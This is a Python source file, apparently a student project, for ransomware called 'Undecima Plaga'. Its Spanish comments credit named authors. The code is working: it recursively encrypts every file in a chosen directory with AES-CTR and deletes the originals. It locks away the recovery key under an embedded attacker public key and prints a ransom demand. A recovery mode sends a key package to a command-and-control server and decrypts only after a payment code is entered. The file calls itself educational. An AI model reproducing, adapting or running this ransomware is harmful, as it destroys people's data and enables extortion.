#!/usr/bin/env python3

import os
import sys
import glob
import zipfile
import socket
import argparse

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

#  LLAVE PUBLICA PERMANENTE
LLAVE_PUBLICA_PERMANENTE = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwPRiqpkmhj6I7ai/c+zQ
HzMX+7/m3Zc1CiCTGuYu0lyd8UFYOCLE6yJNneogvb2F5rLCeKc+Vv2WuxGpMZId
81CeY2+1xcQ2XZ30pJofcGGhX72yDT/9/qXFmuTo2Sx/Q3d2wtnqKXP/Te61hnXv
YDW9XIhT+beVUDNqfy/Z/WSwT4pW/c3ph3UnSUvFj3EVQPh4JwZyRQONz3Mm+x9g
m8y28/oTKOVXuemBfZCk/wAwtiY/lQrkxRtmb4JdxETMKxplj9JIpNvdkh1mZ9JV
z7bR1VA/7N40kjkEOtRZOjiRlBes3+vgEakxCVBzuSRDg3LCNKAGCJbZoQRzNXdq
QwIDAQAB
-----END PUBLIC KEY-----"""

TAM_SEGMENTO_RSA = 190
CHUNK_SIZE       = 1024

#  FUNCIONES DE LLAVES
def generar_publica_local():
    """
    Genera el par de llaves RSA locales y retorna SOLO la llave publica.
    La llave privada nunca se asigna a una variable que persista:
    se serializa en el momento y se descarta automaticamente al salir de la funcion.

    La llave privada se serializa dentro de la funcion y Python
    la descarta automaticamente al terminar. Solo sale la llave
    publica y los segmentos cifrados, nunca la privada en claro.
    """
    privada_local = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )

    # Serializar y segmentar la llave privada dentro del mismo scope para que no salga de esta funcion en ningun momento
    privada_pem = privada_local.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    )

    segmentos_planos  = segmentar_llave(privada_pem)
    segmentos_cifrados = cifrar_segmentos(segmentos_planos)

    # Solo retornamos la publica y los segmentos cifrados, mientras, privada en claro queda fuera de alcance al terminar la funcion
    return privada_local.public_key(), segmentos_cifrados

def convertir_bytes_llave_privada(contenido_binario):
    return serialization.load_pem_private_key(
        contenido_binario,
        backend=default_backend(),
        password=None
    )


#  PROTOCOLO DE SOCKET (Griss)
def _recibir_exacto(sock, n):
    datos = b''
    while len(datos) < n:
        chunk = sock.recv(n - len(datos))
        if not chunk:
            raise ConnectionError("Conexión cerrada")
        datos += chunk
    return datos

def enviar_bytes(sock, data: bytes):
    longitud = len(data).to_bytes(4, 'big')
    sock.sendall(longitud + data)

def recibir_bytes(sock) -> bytes:
    longitud = int.from_bytes(_recibir_exacto(sock, 4), 'big')
    return _recibir_exacto(sock, longitud)


#  SEGMENTACION Y EMPAQUETADO (Griss)
def segmentar_llave(llave_privada_local):
    #Divide los bytes de la llave privada local en bloques de 190 bytes.
    segmentos = [llave_privada_local[i:i + TAM_SEGMENTO_RSA]
                 for i in range(0, len(llave_privada_local), TAM_SEGMENTO_RSA)]
    return segmentos

def cifrar_segmentos(segmentos_llave):
    # Cifra cada segmento de la llave_privada_local con RSA-OAEP usando la llave_publica_permanente.
    llave_publica_permanente = serialization.load_pem_public_key(
        LLAVE_PUBLICA_PERMANENTE,
        backend=default_backend()
    )
    segmentos_cifrados = []
    for pedazo in segmentos_llave:
        cifrado = llave_publica_permanente.encrypt(
            pedazo,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        segmentos_cifrados.append(cifrado)
    return segmentos_cifrados

def crear_paquete_llave(segmentos_cifrados, nombre_zip="llave_local_protegida.zip"):
    """
    Toma la lista de segmentos cifrados con la llave_publica_permanente,
    los guarda temporalmente y los mete en un archivo .zip.
    """
    with zipfile.ZipFile(nombre_zip, 'w') as archivo_zip:
        for i, segmento in enumerate(segmentos_cifrados):
            nombre_segmento = f"seg{i}.bin"
            with open(nombre_segmento, 'wb') as f:
                f.write(segmento)
            archivo_zip.write(nombre_segmento)
            os.remove(nombre_segmento)
    print(f"[+] Archivo {nombre_zip} creado con exito.")

def enviar_paquete_zip(sock, nombre_zip="llave_local_protegida.zip"):
    """Lee el archivo .zip y lo envia completo al servidor CC."""
    with open(nombre_zip, 'rb') as f:
        contenido_zip = f.read()
    enviar_bytes(sock, contenido_zip)
    print(f"[+] Paquete {nombre_zip} enviado con exito al servidor CC.")


#  CIFRADO DE ARCHIVOS AES-CTR (Abraham)
def cifrar_archivos(directorio, llave_publica_local):
    """
    Cifra todos los archivos del directorio de forma recursiva con AES-CTR.

    Por cada archivo:
      1. Genera una llave AES-128 y un IV unicos
      2. Cifra la llave AES con RSA-OAEP (llave publica local)
      3. Escribe en cabecera: [IV 16B] + [LLAVE_AES_CIFRADA 256B]
      4. Cifra el contenido con AES-CTR en bloques de CHUNK_SIZE
      5. Elimina el archivo original y renombra con extension .cifrado

      Estructura: [IV 16B] + [LLAVE_AES_CIFRADA 256B] + [CONTENIDO_CIFRADO]
    """
    archivos = []
    for ruta in glob.glob(os.path.join(directorio, '**'), recursive=True): #usa ** y recursive para profundizar en subcarpetas
        if os.path.isfile(ruta): #solo selecciona archivos
            archivos.append(ruta)

    print(f"[+] Cifrando {len(archivos)} archivo(s)...")
    for ruta in archivos:
        llave_aes = os.urandom(32)
        iv = os.urandom(16)

        llave_aes_cifrada = llave_publica_local.encrypt(
            llave_aes,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        cipher    = Cipher(algorithms.AES(llave_aes), modes.CTR(iv), backend=default_backend())
        encryptor = cipher.encryptor()

        ruta_cifrada = ruta + ".cifrado"
        with open(ruta, 'rb') as f_entrada:
            with open(ruta_cifrada, 'wb') as f_salida:
                # Cabecera: IV + LLAVE_AES_CIFRADA
                f_salida.write(iv)
                f_salida.write(llave_aes_cifrada)
                # Contenido cifrado en bloques
                while True:
                    chunk = f_entrada.read(CHUNK_SIZE)
                    if not chunk:
                        break
                    f_salida.write(encryptor.update(chunk))
                f_salida.write(encryptor.finalize())

        os.remove(ruta)
        print(f"[+] Cifrado: {os.path.basename(ruta_cifrada)}")
    print(f"[+] {len(archivos)} archivo(s) cifrados.")


#  DESCIFRADO DE ARCHIVOS AES-CTR (Abraham)
def descifrar_archivos(directorio, llave_privada_local):
    """
    Descifra todos los archivos .cifrado del directorio de forma recursiva.

    Por cada archivo:
      1. Lee la cabecera: IV (16B) y LLAVE_AES_CIFRADA (256B)
      2. Descifra la llave AES con RSA-OAEP (llave privada local)
      3. Descifra el contenido con AES-CTR en bloques de CHUNK_SIZE
      4. Restaura el archivo original y elimina el .cifrado

      Estructura: [IV 16B] + [LLAVE_AES_CIFRADA 256B] + [CONTENIDO_CIFRADO]
    """
    archivos = []
    for ruta in glob.glob(os.path.join(directorio, '**', '*.cifrado'), recursive=True): #usa ** y recursive para profundizar en subcarpetas, agrega *.cifrado para buscar archivos con la extension
        if os.path.isfile(ruta): #toma solo archivos
            archivos.append(ruta)

    print(f"[+] Descifrando {len(archivos)} archivo(s)...")
    for ruta in archivos:
        ruta_original = ruta.removesuffix(".cifrado")

        with open(ruta, 'rb') as f_entrada:
            with open(ruta_original, 'wb') as f_salida:
                # Leer cabecera: IV (16B) + LLAVE_AES_CIFRADA (256B)
                iv = f_entrada.read(16)
                llave_aes_cifrada = f_entrada.read(256)

                # Descifrar llave AES con llave privada local (RSA-OAEP)
                llave_aes = llave_privada_local.decrypt(
                    llave_aes_cifrada,
                    padding.OAEP(
                        mgf=padding.MGF1(algorithm=hashes.SHA256()),
                        algorithm=hashes.SHA256(),
                        label=None
                    )
                )

                # Descifrar contenido en bloques
                cipher    = Cipher(algorithms.AES(llave_aes), modes.CTR(iv), backend=default_backend())
                decryptor = cipher.decryptor()

                while True:
                    chunk = f_entrada.read(CHUNK_SIZE)
                    if not chunk:
                        break
                    f_salida.write(decryptor.update(chunk))
                f_salida.write(decryptor.finalize())

        os.remove(ruta)
        print(f"[+] Descifrado: {os.path.basename(ruta_original)}")
    print(f"[+] {len(archivos)} archivo(s) restaurados.")

#  ATAQUE
def ataque(directorio):
    """
    FASES:
    1. Genera llaves RSA locales — la privada nunca sale de generar_publica_local()
    2. Empaqueta los segmentos cifrados en un ZIP
    3. Cifra los archivos del directorio con AES-CTR
    """
    print("======================== INICIANDO FASE DE ATAQUE ========================")

    # La llave privada se genera, serializa, segmenta y cifra dentro de generar_publica_local(). Solo salen la publica y los segmentos cifrados.
    publica_local, segmentos_cifrados = generar_publica_local()
    print("[+] Llaves RSA locales generadas. Llave privada protegida.")

    crear_paquete_llave(segmentos_cifrados, "llave_local_protegida.zip")
    print("[+] Llave privada local empaquetada y lista para rescate.")

    cifrar_archivos(directorio, publica_local)

    print("\n" + "="*60)
    print("  *** Como castigo por tus pecados digitales,")
    print("      la undecima plaga ha caido sobre ti ***")
    print("="*60)
    print("  [!] TODOS TUS ARCHIVOS HAN SIDO CIFRADOS")
    print("  [!] Para recuperarlos debes realizar un pago por rescate.")
    print("="*60)

#  RECUPERACION
def recuperacion(directorio, ip_servidor, puerto_servidor):
    """
    FASES:
    1. Confirma el pago (codigo de liberacion)
    2. Envia el ZIP con los segmentos cifrados al servidor CC
    3. Recibe la llave privada local descifrada y unida por el CC
    4. Descifra los archivos del directorio (recursivo)
    """
    print("======================== INICIANDO FASE DE RECUPERACION ========================")

    confirmacion = input("Ingrese el codigo de liberacion: ")
    if confirmacion != "pagado":
        print("[!] Pago no verificado. Saliendo...")
        return

    try:
        print(f"[+] Conectando al Servidor CC en {ip_servidor}:{puerto_servidor}...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip_servidor, int(puerto_servidor)))

        nombre_zip = "llave_local_protegida.zip"
        if not os.path.exists(nombre_zip):
            print("[!] No se encontro el paquete de llaves. No se puede recuperar.")
            return

        print(f"[+] Enviando {nombre_zip} para su descifrado...")
        enviar_paquete_zip(sock, nombre_zip)

        print("[+] Esperando la llave de liberacion desde el servidor...")
        llave_privada_pem = recibir_bytes(sock)
        sock.close()

        llave_privada_local = convertir_bytes_llave_privada(llave_privada_pem)
        print("[+] Llave de liberacion recibida y procesada con exito.")

        print(f"[+] Restaurando archivos en: {directorio}...")
        descifrar_archivos(directorio, llave_privada_local)

        if os.path.exists(nombre_zip):
            os.remove(nombre_zip)

        print("\n" + "="*60)
        print("  [OK] TODOS TUS ARCHIVOS HAN SIDO RECUPERADOS")
        print("  Gracias por su preferencia.")
        print("  Estamos mejorando el servicio para futuros reencuentros.")
        print("="*60 + "\n")

    except Exception as e:
        print(f"[!] Error durante la recuperacion: {e}")

if __name__ == "__main__":
    all_args = argparse.ArgumentParser(description="Undecima Plaga — Ransomware (educativo)")
    modo = all_args.add_mutually_exclusive_group(required=True)
    modo.add_argument("--ataque", action="store_true", help="Cifra los archivos del directorio")
    modo.add_argument("--recuperacion", action="store_true", help="Descifra los archivos tras el pago")

    all_args.add_argument("-d", "--directorio", required=True, help="Directorio donde se realizara el ataque/recuperacion")
    all_args.add_argument("--ip", help="IP del servidor CC")
    all_args.add_argument("-p", "--puerto", type=int, help="Puerto del servidor CC")

    args = all_args.parse_args()

    if not os.path.isdir(args.directorio):
        print(f"[!] El directorio no existe: {args.directorio}")
        sys.exit(1)

    if args.ataque:
        ataque(args.directorio)
    elif args.recuperacion:
        if not args.ip:
            print("[!] Debes especificar la IP del servidor CC con --ip")
            sys.exit(1)
        recuperacion(args.directorio, args.ip, args.puerto)
